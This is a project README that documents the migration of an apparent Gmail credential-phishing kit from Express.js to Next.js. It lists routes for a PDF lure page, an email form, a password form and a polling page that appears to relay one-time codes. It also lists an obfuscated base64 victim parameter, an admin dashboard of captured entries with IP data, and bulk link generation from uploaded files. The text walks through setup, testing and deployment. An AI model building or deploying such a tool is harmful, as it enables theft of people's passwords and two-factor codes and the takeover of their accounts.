# Express.js to Next.js Migration

This document outlines the complete migration of the Gmail OTP application from Express.js to Next.js.

## 🚀 Quick Start

1. **Run the migration script:**
   ```bash
   ./migrate-to-nextjs.sh
   ```

2. **Start the application:**
   ```bash
   npm run dev
   ```

3. **Access the application:**
   - Main app: http://localhost:4000
   - Backend: http://localhost:4000/backend (admin/admin123)

## 📁 Project Structure

```
├── app/                          # Next.js App Router
│   ├── layout.tsx               # Root layout
│   ├── page.tsx                 # Home page (/)
│   ├── error/page.tsx           # Error page
│   ├── load/page.tsx            # Loading page
│   ├── userentry/page.tsx       # User entry form
│   ├── lettus/page.tsx          # Password entry
│   ├── codeload/page.tsx        # Code loading with polling
│   ├── backend/page.tsx         # Admin dashboard
│   └── api/                     # API routes
│       ├── record-click/route.ts
│       ├── submit-user/route.ts
│       ├── submit-password/route.ts
│       ├── codeload-fetch/route.ts
│       └── backend/
├── lib/                         # Utilities
│   ├── database.ts              # MongoDB connection
│   └── utils.ts                 # Helper functions
├── public/                      # Static assets
├── next.config.js               # Next.js configuration
├── tsconfig.json                # TypeScript configuration
└── package.json                 # Dependencies
```

## 🔄 Migration Details

### Routes Converted

| Express Route | Next.js Route | Description |
|---------------|---------------|-------------|
| `/` | `/` | Main landing page with PDF display |
| `/load` | `/load` | Loading animation page |
| `/userentry` | `/userentry` | Email/phone input form |
| `/lettus` | `/lettus` | Password input form |
| `/codeload` | `/codeload` | Loading page with polling |
| `/backend` | `/backend` | Admin dashboard |

### API Routes Converted

| Express API | Next.js API | Description |
|-------------|-------------|-------------|
| `POST /req/submituser` | `POST /api/submit-user` | Submit username |
| `POST /req/submit` | `POST /api/submit-password` | Submit password |
| `GET /codeload/fetch` | `GET /api/codeload-fetch` | Polling endpoint |
| `POST /backend/login` | `POST /api/backend/login` | Admin login |
| `POST /backend` | `POST /api/backend/action` | Admin actions |
| `POST /backend/upload` | `POST /api/backend/upload` | File upload |

### Key Features Preserved

1. **MongoDB Integration**: All database operations maintained
2. **User Tracking**: IP, user agent, timestamps preserved
3. **Base64 Encoding**: URL parameter encoding/decoding
4. **Real-time Polling**: JavaScript polling for status updates
5. **File Upload**: Text file processing for URL generation
6. **Session Management**: Admin authentication
7. **Responsive Design**: All CSS styles preserved

## 🛠 Technical Changes

### Database Layer
- Converted from Express middleware to Next.js utility functions
- Maintained MongoDB connection pooling
- Preserved all collection operations

### Authentication
- Replaced Express sessions with Next.js cookies
- Maintained admin login functionality
- Added authentication middleware for API routes

### Client-Side Logic
- Converted EJS templates to React components
- Preserved all JavaScript functionality
- Maintained CSS styling with styled-jsx

### API Design
- RESTful API routes using Next.js App Router
- Proper error handling and status codes
- Type-safe with TypeScript

## 🔧 Configuration

### Environment Variables
```bash
MONGODB_URI=mongodb://localhost:27017/
```

### Default Credentials
- Username: `admin`
- Password: `admin123`

**⚠️ Change these in production!**

### MongoDB Collections
- `testdb.maintable`: User interactions and data
- `testdb.users`: Admin users

## 🚦 Testing

### Manual Testing Checklist

1. **Main Flow:**
   - [ ] Access with query parameter `?newdownlooad1er4tdbaxuid869=<base64>`
   - [ ] Automatic redirect to loading page
   - [ ] Email/phone form submission
   - [ ] Password form submission
   - [ ] Code loading page with polling

2. **Backend:**
   - [ ] Admin login
   - [ ] Create/clear table operations
   - [ ] View data table
   - [ ] File upload and URL generation

3. **Database:**
   - [ ] User records created/updated
   - [ ] Proper data tracking (IP, user agent, timestamps)

### Sample Test URLs
```
http://localhost:4000/?newdownlooad1er4tdbaxuid869=dGVzdEBleGFtcGxlLmNvbQ==
```
(Base64 for: test@example.com)

## 🔒 Security Considerations

1. **Change default admin credentials**
2. **Use environment variables for sensitive data**
3. **Enable HTTPS in production**
4. **Implement rate limiting**
5. **Validate all user inputs**
6. **Use secure session configuration**

## 📈 Performance Improvements

1. **Server-Side Rendering**: Faster initial page loads
2. **Automatic Code Splitting**: Smaller bundle sizes
3. **Image Optimization**: Built-in Next.js features
4. **API Route Optimization**: Better caching strategies

## 🐛 Troubleshooting

### Common Issues

1. **MongoDB Connection Error:**
   ```bash
   # Ensure MongoDB is running
   mongod
   ```

2. **Port Already in Use:**
   ```bash
   # Change port in package.json or kill existing process
   lsof -ti:4000 | xargs kill -9
   ```

3. **Missing Dependencies:**
   ```bash
   npm install
   ```

4. **TypeScript Errors:**
   ```bash
   npm run build
   ```

## 🚀 Deployment

### Production Build
```bash
npm run build
npm start
```

### Environment Setup
1. Set production MongoDB URI
2. Configure secure session settings
3. Update admin credentials
4. Enable HTTPS
5. Set up proper logging

## 📝 Notes

- All original functionality has been preserved
- The application maintains the same user experience
- Database schema remains unchanged
- All routes and parameters are compatible
- CSS styling is preserved with styled-jsx
- TypeScript provides better type safety
- Next.js provides better performance and SEO

## 🤝 Support

For issues or questions regarding the migration:
1. Check the troubleshooting section
2. Verify MongoDB connection
3. Ensure all dependencies are installed
4. Check browser console for client-side errors
5. Review server logs for API errors